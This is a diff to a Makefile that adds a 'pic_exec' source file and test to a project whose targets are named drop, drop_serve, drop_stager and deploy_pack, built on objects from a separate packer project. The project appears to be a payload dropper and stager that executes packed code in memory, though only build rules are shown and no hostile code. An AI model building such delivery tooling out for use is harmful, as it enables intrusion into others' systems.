@@ -21,14 +21,15 @@ BUILD   := build
 # 复用 20_packer 已编译的目标文件（含 crypto_gcm/hash/x25519 与 shaped/pack/mexec）
 PACKOBJ := $(wildcard ../20_packer/build/*.o)
 
-SRCS    := src/drop.c src/drop_http.c
+SRCS    := src/drop.c src/drop_http.c src/pic_exec.c
 SERVESRC := src/drop_serve.c
 STAGSRC := src/drop_stager.c
 PACKSRC := src/deploy_pack.c
 
 .PHONY: all test clean
 
-all: $(BUILD)/deploy_pack $(BUILD)/drop_serve $(BUILD)/drop_stager $(BUILD)/test_drop $(BUILD)/test_deploy
+all: $(BUILD)/deploy_pack $(BUILD)/drop_serve $(BUILD)/drop_stager \
+     $(BUILD)/test_drop $(BUILD)/test_deploy $(BUILD)/test_pic
 
 $(BUILD):
 	mkdir -p $(BUILD)
@@ -48,9 +49,13 @@ $(BUILD)/test_drop: tests/test_drop.c $(SRCS) $(PACKOBJ) | $(BUILD)
 $(BUILD)/test_deploy: tests/test_deploy.c $(PACKOBJ) | $(BUILD)
 	$(CC) $(CFLAGS) $< $(PACKOBJ) -o $@
 
-test: $(BUILD)/test_drop $(BUILD)/test_deploy
+$(BUILD)/test_pic: tests/test_pic.c $(SRCS) $(PACKOBJ) | $(BUILD)
+	$(CC) $(CFLAGS) $< $(SRCS) $(PACKOBJ) -o $@
+
+test: $(BUILD)/test_drop $(BUILD)/test_deploy $(BUILD)/test_pic
 	./$(BUILD)/test_drop
 	./$(BUILD)/test_deploy
+	./$(BUILD)/test_pic
 
 clean:
 	rm -rf $(BUILD)
